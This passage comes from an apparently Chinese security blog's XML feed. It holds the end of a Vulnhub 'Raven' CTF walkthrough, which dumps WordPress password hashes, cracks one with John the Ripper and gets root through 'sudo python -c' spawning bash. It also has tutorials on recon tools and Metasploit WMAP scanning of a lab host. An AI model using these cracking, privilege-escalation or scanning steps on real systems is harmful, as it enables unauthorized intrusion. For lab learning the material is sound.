|+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+| 1 | michael | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael | michael@raven.org | | 2018-08-12 22:49:12 | | 0 | michael || 2 | steven | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven | steven@raven.org | | 2018-08-12 23:31:16 | | 0 | Steven Seagull |+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+2 rows in set (0.00 sec) 破解哈希值我们发现了两个哈希，但由于我们已经知道Michael的密码，我们使用John the Ripper通过将哈希粘贴到名为“hash”的文本文件中来破解Steven的密码 首先把hash值保存到文件夹下，使用john工具进行破解1root@kali:~/桌面# john 1.txt /usr/share/wordlists/rockyou.txt 解密得到：pink84 登陆steven用户现在，使用steven登录尝试找到的密码。史蒂文是sudo用户吗？12345678910michael@Raven:~$ su stevenPassword:$ sudo -lMatching Defaults entries for steven on raven: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser steven may run the following commands on raven: (ALL) NOPASSWD: /usr/bin/python$ 使用python one-liner产生根TTY好吧，看起来史蒂文可以sudo python命令。登录到steven的shell并运行sudo -l命令，我们发现Python不需要root权限就可以运行。12$ sudo python -c &apos;import os; os.system(&quot;/bin/bash&quot;)&apos;root@Raven:/home/steven# 获取最后的flag12345678910111213141516171819202122232425262728root@Raven:/home/steven# cd /root@Raven:/# find / -name &quot;flag*.txt&quot;/var/www/flag2.txt/root/flag4.txtroot@Raven:/# cat /root/flag4.txt______| ___ \| |_/ /__ ___ _____ _ __| // _` \ \ / / _ \ &apos;_ \| |\ \ (_| |\ V / __/ | | |\_| \_\__,_| \_/ \___|_| |_|flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;CONGRATULATIONS on successfully rooting Raven!This is my first Boot2Root VM - I hope you enjoyed it.Hit me up on Twitter and let me know what you thought:@mccannwj / wjmccann.github.ioroot@Raven:/# 最后我们得到了root和最后的flag。 废话其实在进入mysql数据库后，有个wp_posts.里面村存着flag3和flag4123 | 0 | page | | 0 || 4 | 1 | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; | flag3 | | draft | open | open | | | | | 2018-08-13 01:48:31 | 2018-0 8-13 01:48:31 | | 0 | http://raven.local/wordpress/?p=4 | 0 | post | | 0 || 5 | 1 | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 | flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;]]></content>
      <categories>
        <category>Vulnhub靶场演练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>漏洞靶场</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动式信息搜索]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AF%87%2F%E4%B8%BB%E5%8A%A8%E5%BC%8F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2.html</url>
    <content type="text"><![CDATA[主动信息搜集介绍再主动信息搜索中，我们与目标系统进行交互，从而对其进行更深入的了解。举例来说，我们可以执行端口来确定目标系统开放了哪些端口，运行了那些服务。多发现一个存活的主机或运行中的服务，就多一些渗透成功的机会。需要注意的是，主动的信息收集很可能被IDS和IPS抓住踪迹。 直接与目标系统交互通信 无法避免留下访问的痕迹 使用受控的第三方电脑进行探测： 使用代理或已经被控制的主机 做好被封杀的准备 使用噪声迷惑目标，淹没还真实的探测流量 扫描：发送不同的探测，根据返回结果判断目标状态 端口扫描nmap介绍：nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。基本功能有三个：一是探测一组主机是否在线：其次是扫描主机端口，嗅探所提供的网络服务：三是可以推断主机所用的操作系统。 识别活跃主机查看一个主机是否在线 root@kali:~# nmap -sP 目标IP 端口扫描]]></content>
      <categories>
        <category>WEB安全</category>
        <category>信息搜集篇</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[被动式信息搜集]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AF%87%2F%E8%A2%AB%E5%8A%A8%E5%BC%8F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
    <content type="text"><![CDATA[被动信息搜集介绍使用被动，间接地信息搜集技巧，你可以再不接触到目标系统的情况下挖掘目标信息。举例来说，你可以使用你这些技巧确定网络边界情况和网络运维人员，甚至了解到目标网络中使用的操作系统和网站服务器软件的类型。在搜集目标资料时应该搜集：服务器的配置信息和网站的信息，其中包括网站注册人，目标网站系统，目标服务器系统，目标网站相关子域名，目标服务器所开放的端口和服务器存放网站等。 域名注册人查询whois查询12345678910111213root@kali:~# whois yuhong.com.cnDomain Name: yuhong.com.cnROID: 20021209s10011s00004332-cnDomain Status: clientTransferProhibitedRegistrant ID: hc451003408-cnRegistrant: 北京东方雨虹防水技术股份有限公司Registrant Contact Email: songht@yuhong.com.cnSponsoring Registrar: 阿里云计算有限公司（万网）Name Server: dns9.hichina.comName Server: dns10.hichina.comRegistration Time: 2001-07-18 00:00:00Expiration Time: 2021-07-18 00:00:00DNSSEC: unsigned 域名查询工具DMitry介绍： Dmitry：深度信息挖掘工具。Dmitry是一个由C语言编写的UNIX/(GNU)Linux命令行工具，它可用于收集主机相关信息，比如子域名、Email地址、系统运行时间信息。123456789101112用法：dmitry[-winsepfb][-t 0-9][-o%host.txt]主机-o 将输出保存到%host.txt或-o文件指定的文件-i 对主机的IP地址执行whois查找-w 对主机的域名执行whois查找-n 在主机上检索netcraft.com信息-s 搜索可能存在的子域-e 搜索可能的电子邮件地址-p 在主机上执行TCP端口扫描*-f 在显示输出报告筛选端口的主机上执行TCP端口扫描*-b 读取从扫描端口接收的横幅*-t 0-9在扫描TCP端口时以秒为单位设置TTL（默认为2）*要求传递标记为-p的 实例1234567891011root@kali:~# dmitry -iwnse yuhong.com.cnDeepmagic Information Gathering Tool&quot;There be some deep magic going on&quot;HostIP:118.190.27.202HostName:yuhong.com.cnGathered Inet-whois information for 118.190.27.202---------------------------------inetnum: 116.204.0.0 - 125.62.71.255此处省略········· DNS枚举firece工具主要对子域名进行扫描和收集信息，可以获取一个目标主机上所有的IP地址和主机信息。root@kali:~# fierce -dns 目标站点执行暴力破解，测试的数量取决于字典中提供的字符串数量，可以使用自带的hosts.txt。也可以自定义字典将一些常用的字段输入进去，root@kali:~# fierce -dns 目标站点 -wordlist /usr/share/fierce/hosts.txt在知道了目标站点IP地址的情况下，可以再次使用whois查询获得一些信息。 aqautone工具介绍：是一套用于对域名进行侦察的工具。它可以通过使用开放源码和更常见的子域名字典暴力法来发现给定域上的子域。在子域发现后，AQUATONE可以扫描主机以查找常见的Web端口，HTTP头，HTML主体和屏幕截图可以收集并整合到一个报告中，以便于对攻击面进行分析。aquatone-discover：使用被动收集或字典爆破方式发现子域名aquatone-scan：完成子域名扫描后，可扫描域名开放端口、HTTP header、HTML body、截图等信息并生成报告aquatone-gather：对扫描结果中的IP进行访问请求和网页截图，搜集信息aquatone-takeover：检测域名是否存在子域名劫持风险工具之间能互相利用其他工具扫描生成的结果开展下一步工作。12345678910root@kali:~# aquatone-discover -d 目标站点 __ ____ _____ ___ ______ _/ /_____ ____ ___ / __ `/ __ `/ / / / __ `/ __/ __ \/ __ \/ _ \/ /_/ / /_/ / /_/ / /_/ / /_/ /_/ / / / / __/\__,_/\__, /\__,_/\__,_/\__/\____/_/ /_/\___/ /_/ discover v0.5.0 - by @michenriksenIdentifying nameservers for yuhong.com.cn... DoneUsing nameservers: nslookup介绍：nslookup命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。指令只是一个检查网络联通情况的命令，虽然在输入的参数是域名的情况下会通过DNS进行查询，但是它只能查询A类型和CNAME类型的记录，而且只会告诉你域名是否存在，其他的信息一概欠奉。所以如果你需要对DNS的故障进行排错就必须熟练另一个更强大的工具nslookup。这个命令可以指定查询的类型，可以查到DNS记录的生存时间还可以指定使用那个DNS服务器进行解释。 指定类型查询set type=mx查询其他类型的域名 如果没有加任何参数，所以默认情况下nslookup查询的是A类型的记录。如果我们配置了其他类型的记录希望看到解释是否正常。这时候ping就无能为力了。比如我们配置了MX记录，但是邮件服务器只能发信不能收信，到底是域名解释问题还是其他的问题Ping命令的检查只能让你误入歧途。nslookup 这时候可以模拟你的其他遇见服务器进行域名解释的情况。我们需要在nslookup上加上适当的参数。指定查询记录类型的指令格式如下： nslookup –qt=类型 目标域名 注意qt必须小写。 类型可以是一下字符，不区分大小写：123456789101112131415161718192021222324252627C:\Users\FRANCI4&gt;nslookup -qt=mx yuhong.com.cn服务器: UnKnownAddress: 192.168.0.1非权威应答:yuhong.com.cn MX preference = 10, mail exchanger = mail.yuhong.com.cnyuhong.com.cn nameserver = dns9.hichina.comyuhong.com.cn nameserver = dns10.hichina.comdns9.hichina.com internet address = 106.11.141.115dns9.hichina.com internet address = 106.11.141.125dns9.hichina.com internet address = 106.11.211.55dns9.hichina.com internet address = 106.11.211.65dns9.hichina.com internet address = 140.205.41.15dns9.hichina.com internet address = 140.205.41.25dns9.hichina.com internet address = 140.205.81.15dns9.hichina.com internet address = 140.205.81.25dns10.hichina.com internet address = 106.11.141.126dns10.hichina.com internet address = 106.11.211.56dns10.hichina.com internet address = 106.11.211.66dns10.hichina.com internet address = 140.205.41.16dns10.hichina.com internet address = 140.205.41.26dns10.hichina.com internet address = 140.205.81.16dns10.hichina.com internet address = 140.205.81.26dns10.hichina.com internet address = 106.11.141.116dns9.hichina.com AAAA IPv6 address = 2400:3200:2000:28::1dns10.hichina.com AAAA IPv6 address = 2400:3200:2000:29::1 其他配置命令 A 地址记录(Ipv4) AAAA 地址记录（Ipv6） AFSDB Andrew文件系统数据库服务器记录（不懂） ATMA ATM地址记录（不是自动提款机） CNAME 别名记录 HINFO 硬件配置记录，包括CPU、操作系统信息 ISDN 域名对应的ISDN号码 MB 存放指定邮箱的服务器 MG 邮件组记录 MINFO 邮件组和邮箱的信息记录 MR 改名的邮箱记录 MX 邮件服务器记录 NS 名字服务器记录 PTR 反向记录（从IP地址解释域名） RP 负责人记录 RT 路由穿透记录（不懂） SRV TCP服务器信息记录（将有大用处） TXT 域名对应的文本信息 X25 域名对应的X.25地址记录 欢迎补充]]></content>
      <categories>
        <category>WEB安全</category>
        <category>信息搜集篇</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit's Wmap]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2Fmetasploit%2FMetasploit-s-Wmap.html</url>
    <content type="text"><![CDATA[简介WMAP是一个功能丰富的Web应用程序漏洞扫描程序，最初是从名为SQLMap的工具创建的。该工具与Metasploit集成，允许我们从Metasploit框架内进行Web应用程序扫描。 拥有高效的工作流程是任何工具的重要组成部分，但在探测应用程序的漏洞时尤为重要。虽然Metasploit在开发时被认为是事实上的标准，但它也包含其他活动的模块，例如scanning。例如，WMAP，一种可在Metasploit框架内使用的Web应用程序扫描程序。 Web应用程序扫描程序是用于识别Web应用程序中存在的漏洞的工具。WMAP可以轻松保持流畅的工作流程，因为它可以在Metasploit内部工作时加载和运行 实践操作步骤一在运行 Metasploit 终端前，我们需要先启动用于存储扫描结果的数据库服务：root@kali:~# service postgresql start 步骤二启动命令行终端，运行 Metasploit 控制台：root@kali:~# msfconsole 步骤三加载WMAP使用load wmap命令加载WMAP模块：msf &gt; load wmap从这里，如果我们打字？要显示Metasploit的帮助菜单，我们应该在菜单顶部看到WMAP的命令及其描述。123456789101112msf &gt; ?wmap Commands============= Command Description ------- ----------- wmap_modules Manage wmap modules 管理wmap模块 wmap_nodes Manage nodes 管理节点 wmap_run Test targets 测试目标 wmap_sites Manage sites 管理网站 wmap_targets Manage targets 管理目标 wmap_vulns Display web vulns 显示网页漏洞 步骤四添加要扫描的站点键入任何命令以显示其可用选项; 让我们从使用wmap_sites管理我们希望扫描的网站开始。1234567msf &gt; wmap_sites [*] Usage: wmap_sites [options] -h Display this help text 显示此帮助文本 -a [url] Add site (vhost,url) 添加站点（vhost,url） -d [ids] Delete sites (separate ids with space) 删除站点（用空格分隔id） -l List all available sites 列出所有可用站点 -s [id] Display site structure (vhost,url|ids) (level) (unicode output true/false) 显示站点结构（vhost,url,ids）（级别）（Unicode输出真/假） 要添加站点，请使用带有-a标志的wmap_sites，后跟站点地址。12msf &gt; wmap_sites -a http://192.168.126.142[*] Site created. 站点创建 现在我们可以使用带有-l标志的wmap_sites列出可用站点1234567msf &gt; wmap_sites -l[*] Available sites=============== Id Host Vhost Port Proto # Pages # Forms -- ---- ----- ---- ----- ------- ------- 0 192.168.126.142 192.168.126.142 80 http 0 0 步骤五指定目标URL接下来，我们需要使用wmap_targets设置我们要扫描的特定目标网址。1234567msf &gt; wmap_targets [*] Usage: wmap_targets [options] -h Display this help text 显示此帮助文本 -t [urls] Define target sites (vhost1,url[space]vhost2,url) 定义目标站点（vhost1,url[space]vhost2,url） -d [ids] Define target sites (id1, id2, id3 ...) 定义目标站点（id1，id2，id3 ......） -c Clean target sites list 清理目标站点列表 -l List all target sites 列出所有目标站点 我们可以使用带有-t标志的wmap_targets定义目标，然后是URL。 msf &gt; wmap_targets -t http://192.168.126.142/index.php 并使用带有-l标志的wmap_targets列出已定义的目标1234567msf &gt; wmap_targets -l[*] Defined targets=============== Id Vhost Host Port SSL Path -- ----- ---- ---- --- ---- 0 192.168.126.142 192.168.126.142 80 false /index.php 我们现在应该很好，所以唯一要做的就是实际运行扫描仪。 步骤六运行扫描仪在提示符下键入wmap_run以查看此命令的选项12345678msf &gt; wmap_run[*] Usage: wmap_run [options] -h Display this help text 显示此帮助文本 -t Show all enabled modules 显示所有已启用的模块 -m [regex] Launch only modules that name match provided regex. 仅启动名称匹配的模块提供正则表达式 -p [regex] Only test path defined by regex. 仅由正则表达式定义的测试路径 -e [/path/to/profile] Launch profile modules against all matched targets. 针对所有匹配的目标启动配置文件模块 (No profile file runs all enabled modules.) 没有配置文件运行所有已启用的模块 在扫描目标之前，我们可以使用带有-t标志的wmap_run列出所有已启用的模块12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364msf &gt; wmap_run -t[*] Testing target: 测试目标[*] Site: 192.168.126.142 (192.168.126.142) 网站[*] Port: 80 SSL: false 端口============================================================[*] Testing started. 2019-01-12 18:34:02 +0800 测试开始[*] Loading wmap modules...[*] 39 wmap enabled modules loaded.[*] =[ SSL testing ]= SSL测试============================================================[*] Target is not SSL. SSL modules disabled. 目标不是SSL。模糊测试已禁用[*] =[ Web Server testing ]= web服务器测试============================================================[*] Module auxiliary/scanner/http/http_version[*] Module auxiliary/scanner/http/open_proxy[*] Module auxiliary/admin/http/tomcat_administration[*] Module auxiliary/admin/http/tomcat_utf8_traversal[*] Module auxiliary/scanner/http/drupal_views_user_enum[*] Module auxiliary/scanner/http/frontpage_login[*] Module auxiliary/scanner/http/host_header_injection[*] Module auxiliary/scanner/http/options[*] Module auxiliary/scanner/http/robots_txt[*] Module auxiliary/scanner/http/scraper[*] Module auxiliary/scanner/http/svn_scanner[*] Module auxiliary/scanner/http/trace[*] Module auxiliary/scanner/http/vhost_scanner[*] Module auxiliary/scanner/http/webdav_internal_ip[*] Module auxiliary/scanner/http/webdav_scanner[*] Module auxiliary/scanner/http/webdav_website_content[*] =[ File/Dir testing ]=============================================================[*] Module auxiliary/scanner/http/backup_file[*] Module auxiliary/scanner/http/brute_dirs[*] Module auxiliary/scanner/http/copy_of_file[*] Module auxiliary/scanner/http/dir_listing[*] Module auxiliary/scanner/http/dir_scanner[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass[*] Module auxiliary/scanner/http/file_same_name_dir[*] Module auxiliary/scanner/http/files_dir[*] Module auxiliary/scanner/http/http_put[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass[*] Module auxiliary/scanner/http/prev_dir_same_name_file[*] Module auxiliary/scanner/http/replace_ext[*] Module auxiliary/scanner/http/soap_xml[*] Module auxiliary/scanner/http/trace_axd[*] Module auxiliary/scanner/http/verb_auth_bypass[*] =[ Unique Query testing ]=============================================================[*] Module auxiliary/scanner/http/blind_sql_query[*] Module auxiliary/scanner/http/error_sql_injection[*] Module auxiliary/scanner/http/http_traversal[*] Module auxiliary/scanner/http/rails_mass_assignment[*] Module exploit/multi/http/lcms_php_exec[*] =[ Query testing ]=============================================================[*] =[ General testing ]=============================================================[*] Done. 有一些不同类别的模块，包括用于目录测试，查询测试，Web服务器测试和SSL测试的模块，尽管我们可以看到我们的目标不使用SSL，因此这些模块被禁用。要获得任何给定模块的详细说明，请使用info命令，后跟列出的模块的完整路径。例如12345678910111213141516171819202122232425msf &gt; info auxiliary/scanner/http/http_version Name: HTTP Version Detection Module: auxiliary/scanner/http/http_version License: Metasploit Framework License (BSD) Rank: NormalProvided by: hdm &lt;x@hdm.io&gt;Check supported: YesBasic options: Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target address range or CIDR identifier RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads VHOST no HTTP server virtual hostDescription: Display version information about each system. 回到扫描。让我们使用带有-e标志的wmap_run开始扫描，该标志将运行所有模块而不是指定的模块。根据目标站点和已启用模块的数量，扫描可能需要相当长的时间才能完成。完成后，扫描将显示完成所需的时间12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152msf &gt; wmap_run -e[*] Using ALL wmap enabled modules.[-] NO WMAP NODES DEFINED. Executing local modules[*] Testing target:[*] Site: 192.168.126.142 (192.168.126.142)[*] Port: 80 SSL: false============================================================[*] Testing started. 2019-01-12 18:41:14 +0800[*] =[ SSL testing ]=============================================================[*] Target is not SSL. SSL modules disabled.[*] =[ Web Server testing ]=============================================================[*] Module auxiliary/scanner/http/http_version[+] 192.168.126.142:80 Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 ( Powered by PHP/5.4.45 )[*] Module auxiliary/scanner/http/open_proxy[*] Module auxiliary/admin/http/tomcat_administration[*] Module auxiliary/admin/http/tomcat_utf8_traversal[*] Attempting to connect to 192.168.126.142:80[+] No File(s) found[*] Module auxiliary/scanner/http/drupal_views_user_enum[-] 192.168.126.142 does not appear to be vulnerable, will not continue[*] Module auxiliary/scanner/http/frontpage_login[*] 192.168.126.142:80 - http://192.168.126.142/ may not support FrontPage Server Extensions[*] Module auxiliary/scanner/http/host_header_injection[*] Module auxiliary/scanner/http/options[*] Module auxiliary/scanner/http/robots_txt[*] Module auxiliary/scanner/http/scraper[+] [192.168.126.142] / [upload-labs][*] Module auxiliary/scanner/http/svn_scanner[*] Using code &apos;404&apos; as not found.[*] Module auxiliary/scanner/http/trace[*] Module auxiliary/scanner/http/vhost_scanner[*] &gt;&gt; Exception during launch from auxiliary/scanner/http/vhost_scanner: The following options failed to validate: DOMAIN.[*] Module auxiliary/scanner/http/webdav_internal_ip[*] Module auxiliary/scanner/http/webdav_scanner[*] 192.168.126.142 (Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45) WebDAV disabled.[*] Module auxiliary/scanner/http/webdav_website_content[*] =[ File/Dir testing ]=============================================================[*] Module auxiliary/scanner/http/backup_file[*] Module auxiliary/scanner/http/brute_dirs[*] Path: /[*] Using code &apos;404&apos; as not found.[+] Found http://192.168.126.142:80/js/ 403[+] Found http://192.168.126.142:80/aux/ 403[+] Found http://192.168.126.142:80/con/ 403[+] Found http://192.168.126.142:80/css/ 403 步骤七解释结果最后，我们可以输入wmap_vulns -l命令来显示扫描结果。12345678910111213141516171819202122232425262728293031323334msf &gt; wmap_vulns -l[*] + [192.168.126.142] (192.168.126.142): scraper /[*] scraper Scraper[*] GET upload-labs[*] + [192.168.126.142] (192.168.126.142): directory /aux/[*] directory Directory found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /con/[*] directory Directory found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /nul/[*] directory Directory found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /prn/[*] directory Directory found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /.../[*] directory Directoy found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /css/[*] directory Directoy found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /doc/[*] directory Directoy found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /img/[*] directory Directoy found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /js/[*] directory Directoy found.[*] GET Res code: 403[*] + [192.168.126.142] (192.168.126.142): directory /upload/[*] directory Directoy found.[*] GET Res code: 403 我们可以看到它发现了一些可能值得进一步调查的可能有趣的目录：/ cgi-bin /目录允许执行脚本并直接在服务器上执行类似控制台的功能。/ phpMyAdmin /目录是MySQL数据库系统的开源管理工具。/ dav /目录允许用户远程协作和执行Web创作活动。WMAP可能不会像其他Web应用程序漏洞扫描程序那样返回详细结果，但这些信息可以成为探索不同攻击途径的有用起点。事实上，这个扫描仪可以从Metasploit框架中轻松加载和使用，这使它成为了解如何使用的有用工具。 总结Metasploit是一个功能强大的工具，不仅可以用于开发，还具有大量其他模块，可以直接在框架内加载和运行，使其成为渗透测试和道德黑客攻击的绝对强大。在本教程中，我们学习了如何快速启动和运行Metasploit的数据库系统，以及如何使用WMAP插件扫描Web应用程序中的漏洞。这只是Metasploit框架中许多非常有用的模块之一，每天都有更多的模块可以满足各地白帽的需求。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
        <tag>渗透测试</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit的入门用法]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2Fmetasploit%2Fmetasploit%E7%9A%84%E5%85%A5%E9%97%A8%E7%94%A8%E6%B3%95.html</url>
    <content type="text"><![CDATA[Metasploit简介Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。 Metasploit的设计初衷是打造成一个攻击工具开发平台，稍后将讲解如何开发攻击工具。然而在目前情况下，安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。 Metasploit的工作方式开源软件Metasploit是H.D. Moore在2003年开发的，它是少数几个可用于执行诸多渗透测试步骤的工具。在发现新漏洞时(这是很常见的)，Metasploit会监控Rapid7，然后Metasploit的200,000多个用户会将漏洞添加到Metasploit的目录上。然后，任何人只要使用Metasploit，就可以用它来测试特定系统的是否有这个漏洞。 Metasploit框架使Metasploit具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击。所有这些操作都可以通过Metasploit的Web界面进行管理，而它只是其中一种种管理接口，另外还有命令行工具和一些商业工具等等。 攻击者可以将来自漏洞扫描程序的结果导入到Metasploit框架的开源安全工具Armitage中，然后通过Metasploit的模块来确定漏洞。一旦发现了漏洞，攻击者就可以采取一种可行方法攻击系统，通过Shell或启动Metasploit的meterpreter来控制这个系统。 这些有效载荷就是在获得本地系统访问之后执行的一系列命令。这个过程需要参考一些文档并使用一些数据库技术，在发现漏洞之后开发一种可行的攻击方法。其中有效载荷数据库包含用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前BO2K等工具所具备的功能。 特点这种可以扩展的模型将负载控制，编码器，无操作生成器和漏洞整合在一起，使 Metasploit Framework 成为一种研究高危漏洞的途径。它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新。最新版本的 MSF 包含了750多种流行的操作系统及应用软件的漏洞，以及224个 shellcode 。作为安全工具，它在安全检测中用着不容忽视的作用，并为漏洞自动化探测和及时检测系统漏洞提供了有力保障。 Metasploit自带上百种漏洞，还可以在online exploit building demo(在线漏洞生成演示)上看到如何生成漏洞。这使自己编写漏洞变得更简单，它势必将提升非法shellcode的水平，并且扩大网络阴暗面。与其相似的专业漏洞工具，如Core Impact和Canvas已经被许多专业领域用户使用。Metasploit降低了使用的门槛，将其推广给大众。 Metasploit的使用在运行 Metasploit 终端前，我们需要先启动MSF默认的数据库用于存储结果的数据库服务Metasploit利用PostgreSQL 数据库系统，在进行渗透测试时跟踪大量信息非常有用。这允许从其他工具导入和导出扫描结果，以及存储已发现的凭据，服务和其他有价值的数据。 root@kali:~# /etc/init.d/postgresql start 如果是第一次使用，我们可以在终端中使用msfdb init命令初始化数据库。这将为Metasploit创建一个默认数据库和用户进行交互。 msfdb init初始化msfdb start开启数据库你可以进入postgresql数据库中新建一个数据库并绑定metasploit 启动命令行终端，运行metaspoit控制台root@kali:~# msfconsole 最后，我们可以使用db_status命令检查数据库是否已加载并正常工作12msf &gt; db_status[*] postgresql connected to msf]]></content>
      <categories>
        <category>WEB安全</category>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
        <tag>渗透测试</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit基础命令总结]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2Fmetasploit%2Fmetasploit%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.html</url>
    <content type="text"><![CDATA[基础命令介绍msfconsole：启动MSF终端banner ：显示一个非常棒的 bannercd： 改变当前的工作目录color： 切换颜色connect（远程连接）： 与主机通信edit （编辑）： 编辑与$ VISUAL或$ EDITOR当前模块的exit （退出命令行）： 退出控制台get （获取变量）： 获取特定上下文变量的值getg （全局获取变量）： 获取一个全局变量的值go_pro ： 启动Metasploit的网页图形用户界面 grep： grep的另一个命令的输出help（帮助） ： 帮助菜单info（获取模块信息）： 关于一个或多个模块显示信息irb： 进入irb脚本模式jobs：显示和管理职位kill（结束进程）： 结束一个进程load （加载）： 加载一个框架插件loadpath ： 搜索和负载从一个路径模块makerc： 保存自开始进入到一个文件中的命令popm： 弹出最新的模块从堆栈中并使其活跃 previous ： 将以前加载模块作为当前模块pushm ： 推主动或模块列表在模块栈quit （退出控制台）： 退出控制台reload_all Reloads ： 从所有定义的模块路径的所有模块rename_job ： 重命名工作resource ： 运行存储命令在文件route ： 通过会话路由流量save： 将数据存储主动search（搜索exp等模块关键字）： 搜索模块的名称和说明sessions（会话功能）： 转储会话列表和显示有关会话的信息 set （设置参数）： 设置一个特定的上下文变量的值setg（全局设置参数）： 设置一个全局变量的值show （展示参数模块）： 给定类型的显示模块或所有模块sleep ： 什么都不做对的指定秒数spool ： 写控制台输出到一个文件以及屏幕threads ： 查看和操作后台线程unload （卸载某个插件）： 卸载一个框架插件unset （删除某个设置参数）： 取消设置一个或多个特定的上下文变量unsetg （取消全局某个设置参数）： 取消设置一个或多个全局变量的use （使用某个模块）： 选择按名称模块version（查看版本信息）： 显示的框架和控制台库版本号 命令作用详情use：当你已经决定在一个特定的模块使用,使用的命令以选中它。使用的命令改变你的环境到一个特定的模块,将特定类型的命令。back：切换上下模块，返回上一步骤。一旦你已经完成了工作与一个特定的模块,或者如果你无意中选择了错误的模块,你可以“恢复”命令将当前上下文。search：msfconsole包括一个广泛的基于正则表达式的搜索功能。如果你有一个总体的想法你正在寻找你可以通过“搜索”搜索。在下面的输出中,搜索是ms08-067。搜索功能将在模块定位这个字符串名称、描述、参考文献等。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
        <tag>渗透测试</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入http请求流程]]></title>
    <url>%2Funcategorized%2F%E6%B7%B1%E5%85%A5HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B.html</url>
